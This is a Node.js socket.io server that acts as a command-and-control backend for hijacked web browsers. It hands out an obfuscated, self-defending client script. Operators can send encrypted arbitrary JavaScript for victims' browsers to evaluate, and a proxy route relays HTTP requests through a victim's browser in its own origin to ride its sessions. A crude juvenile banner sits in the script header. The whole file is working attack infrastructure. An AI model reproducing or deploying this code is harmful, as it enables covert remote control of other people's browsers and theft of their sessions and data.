const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const cors = require("cors");
const bodyParser = require("body-parser");
const CryptoJS = require("crypto-js");
const dotenv = require("dotenv");
const fs = require("fs");
const JsConfuser = require("js-confuser");

dotenv.config();

const clientsCallbacks = {};
const temporaryCallbacks = {};
const authCallbacks = {};

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
	cors: {
		origin: "*",
		// methods: ["GET", "POST"],
	},
});

app.use(
	cors({
		origin: "*",
		// methods: ["GET", "POST"],
	})
);
app.use(express.static("public"));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const secretPassphrase = process.env.SECRET_PASSPHRASE;

// Ensure consistent key generation
function getKeyFromPassphrase(passphrase) {
	return CryptoJS.enc.Hex.parse(
		CryptoJS.SHA256(passphrase).toString().substr(0, 32)
	);
}

// Encrypt data
function encryptData(data, secretPassphrase) {
	const key = getKeyFromPassphrase(secretPassphrase);
	const iv = CryptoJS.lib.WordArray.random(16);
	const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), key, { iv: iv });
	return iv.toString() + ":" + encrypted.toString();
}

// Decrypt data
function decryptData(ciphertext, secretPassphrase) {
	const key = getKeyFromPassphrase(secretPassphrase);
	const textParts = ciphertext.split(":");
	const iv = CryptoJS.enc.Hex.parse(textParts.shift());
	const encryptedText = textParts.join(":");
	const decrypted = CryptoJS.AES.decrypt(encryptedText, key, { iv: iv });
	try {
		return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
	} catch (e) {
		return decrypted.toString(CryptoJS.enc.Utf8);
	}
}

const scriptHeadText = `
/*
	______   ______   __  __   ____     ____   __     __    _____    ______   __  __    ____    _______   ______         ____  
	|  ____| |  ____| |  \\/  | |  _ \\   / __ \\  \\ \\   / /   |  __ \\  |  ____| |  \\/  |  / __ \\  |__   __| |  ____|    _  |___ \\ 
	| |__    | |__    | \\  / | | |_) | | |  | |  \\ \\_/ /    | |__) | | |__    | \\  / | | |  | |    | |    | |__      (_)   __) |
	|  __|   |  __|   | |\\/| | |  _ <  | |  | |   \\   /     |  _  /  |  __|   | |\\/| | | |  | |    | |    |  __|          |__ < 
	| |      | |____  | |  | | | |_) | | |__| |    | |      | |  \\ \  | |____  | |  | | | |__| |    | |    | |____     _   ___) |
	|_|      |______| |_|  |_| |____/   \\____/     |_|      |_|   \\_\ |______| |_|  |_|  \\____/     |_|    |______|   (_) |____/ 
																																
												
	sniff sniff i-is that a BOY I smell? sniff sniff mmm yes I smell it! BOYSMELL!!!! I smell a boy! W-What is a boy doing here?!?! omygosh what am I gonna do?!?! THERE'S A BOY HERE! I'M FREAKING OUT SO MUCH!!!! calm down calm down and take a nice, deep breathe.... sniff sniff it smells so good! I love boysmell so much!!!! It makes me feel so amazing. I'm getting tingles all over from the delicious boyscent! It's driving me boyCRAZY!!!!!!
*/

`;
// Serve the main page or script file based on the query
app.get("/", async (req, res) => {
	try {
		let finalScript = fs.readFileSync(__dirname + "/client.js", "utf8");
		finalScript = finalScript.replace(
			"$$SECRET_PASSPHRASE$$",
			secretPassphrase
		);
		finalScript = finalScript.replace(
			"$$SOCKET_SERVER_URL$$",
			process.env.HOST
		);

		const obfuscated = await JsConfuser.obfuscate(finalScript, {
			target: "browser",
			preset: "low",
			lock: {
				antiDebug: false,
				renameGlobals: true,
				selfDefending: true,
				integrity: true,
				// context: ["browser"], // Set context as an array with "browser" as an element
			},
			identifierGenerator: function () {
				return "ilovefemboys" + Math.random().toString(36).substring(7);
			},
		});

		res.setHeader("Content-Type", "application/javascript");
		res.setHeader(
			"Content-Length",
			Buffer.byteLength(scriptHeadText + obfuscated, "utf8")
		);
		res.send(scriptHeadText + obfuscated);
	} catch (error) {
		console.error("Error processing the script:", error);
		res.status(500).send("Internal Server Error");
	}
});

io.on("connection", (socket) => {
	console.log(`Socket connected: ${socket.id}`);

	// Handle authentication
	socket.once("auth", (password) => {
		if (password === process.env.CONNECT_PASSWORD) {
			authCallbacks[socket.id] = socket;
			console.log(`Authentication successful for socket: ${socket.id}`);
			socket.emit("auth", "success");
		} else {
			console.log(`Authentication failed for socket: ${socket.id}`);
			socket.emit("auth", "fail");
			socket.disconnect();
		}
	});

	// Handle socket disconnection
	socket.on("disconnect", () => {
		console.log(`Socket disconnected: ${socket.id}`);
		delete temporaryCallbacks[socket.id];
		delete clientsCallbacks[socket.id];
		delete authCallbacks[socket.id];

		// Notify other authenticated sockets about the updated list
		Object.values(authCallbacks).forEach((callbackSocket) => {
			callbackSocket.emit("c_getdata", clientsCallbacks);
		});
	});

	// Handle data request from authenticated sockets
	socket.on("s_getdata", (password) => {
		if (authCallbacks[socket.id]) {
			console.log(`Data request authenticated for socket: ${socket.id}`);
			socket.emit("c_getdata", clientsCallbacks);
		} else {
			console.log(`Unauthorized data request from socket: ${socket.id}`);
			socket.emit("auth", "fail");
		}
	});

	// Handle command evaluation requests
	socket.on("s_commands", (id, commands) => {
		if (authCallbacks[socket.id]) {
			console.log(`Commands received from socket: ${socket.id} for id: ${id}`);
			if (temporaryCallbacks[id]) {
				const encryptedCommands = encryptData(commands, secretPassphrase);
				temporaryCallbacks[id].emit("c_eval", socket.id, encryptedCommands);
			}
		} else {
			console.log(`Unauthorized command request from socket: ${socket.id}`);
			socket.emit("auth", "fail");
		}
	});

	// Handle evaluation results
	socket.on("s_eval", (id, status, result) => {
		if (authCallbacks[id]) {
			console.log(
				`Eval result received for id: ${id} from socket: ${socket.id} with status: ${status}`
			);
			const decryptedResult = decryptData(result, secretPassphrase);
			authCallbacks[id].emit("c_result", status, decryptedResult);
		}
	});

	// Handle new connection data
	socket.on("s_connect", (encryptedData) => {
		try {
			const data = decryptData(encryptedData, secretPassphrase);
			console.log(`s_connect event received from socket: ${socket.id}`);
			temporaryCallbacks[socket.id] = socket;
			clientsCallbacks[socket.id] = data;

			// // Inject the remoteSocketCode into the client script
			// const encryptedRemoteSocketCode = encryptData(
			// 	remoteSocketCode,
			// 	secretPassphrase
			// );

			// socket.emit("c_eval", 0, encryptedRemoteSocketCode);

			// Notify all authenticated sockets about the new data
			Object.values(authCallbacks).forEach((callbackSocket) => {
				callbackSocket.emit("c_getdata", clientsCallbacks);
			});
		} catch (error) {
			console.error(
				`Error decrypting data from socket: ${socket.id} - ${error.message}`
			);
		}
	});
});

const { v4: uuidv4 } = require("uuid"); // Make sure to install the uuid package

// Proxy requests to the specified socket
// Proxy requests to the specified socket
app.all("/remote/:socketid/*", (req, res) => {
	const socketid = req.params.socketid;
	const route = req.params[0];
	const socket = temporaryCallbacks[socketid];
	const queryParameters = req.query;

	if (!socket) {
		return res.status(404).send("Socket not found");
	}

	// Generate a unique ID for the request
	const requestId = uuidv4();

	socket.on("s_route", (req_id, id, status, encryptedResult) => {
		if (req_id !== requestId) {
			return; // Ignore if the ID does not match
		}

		const decryptedResult = decryptData(encryptedResult, secretPassphrase);

		if (status !== "success") {
			return res.send(`Error: ${decryptedResult.message}`);
		}

		const { arrayBuffer, headers } = decryptedResult;
		res.setHeader("content-type", headers["content-type"]);
		console.log(headers["content-type"]);
		const isTextType = ["text/html", "text/css", "application/javascript"].some(
			(type) => headers["content-type"].includes(type)
		);

		// decode the arrayBuffer from base64
		const decodedArrayBuffer = Buffer.from(arrayBuffer, "base64");
		console.log(decodedArrayBuffer);
		if (isTextType) {
			const decodedResult = new TextDecoder().decode(decodedArrayBuffer);
			const queryStr = Object.keys(queryParameters).length
				? `?${new URLSearchParams(queryParameters)}`
				: "";
			let injectedResult = decodedResult.replace(
				/(\w+)="\/([^"]*)"/g,
				(match, p1, p2) => {
					return `${p1}="${process.env.HOST}/remote/${socketid}//${p2}${queryStr}"`;
				}
			);

			injectedResult = injectedResult.replace(
				new RegExp(clientsCallbacks[socketid].origin, "g"),
				`${process.env.HOST}/remote/${socketid}`
			);

			console.log(clientsCallbacks[socketid].origin);
			return res.send(injectedResult);
		}

		res.send(arrayBuffer);
	});

	const queryStr = Object.keys(queryParameters).length
		? `?${new URLSearchParams(queryParameters)}`
		: "";
	let body = null;
	let bodyType = "text";

	if (req.method !== "GET" && req.method !== "HEAD") {
		if (req.is("application/json")) {
			body = JSON.stringify(req.body);
			bodyType = "json";
		} else if (req.is("text/plain")) {
			body = req.body;
			bodyType = "text";
		} else if (req.is("application/x-www-form-urlencoded")) {
			body = new URLSearchParams(req.body).toString();
			bodyType = "form-urlencoded";
		} else {
			body = req.body;
			bodyType = "text";
		}
	}

	const routeData = {
		route: `${route}${queryStr}`,
		method: req.method,
		body: {
			body,
			type: bodyType,
		},
	};

	const encryptedRouteData = encryptData(routeData, secretPassphrase);

	// Include the requestId in the c_route event
	socket.emit("c_route", requestId, socketid, encryptedRouteData);
});

const port = process.env.PORT || 3001;

server.listen(port || 3001, () => {
	console.log("Listening on *:" + port);
});
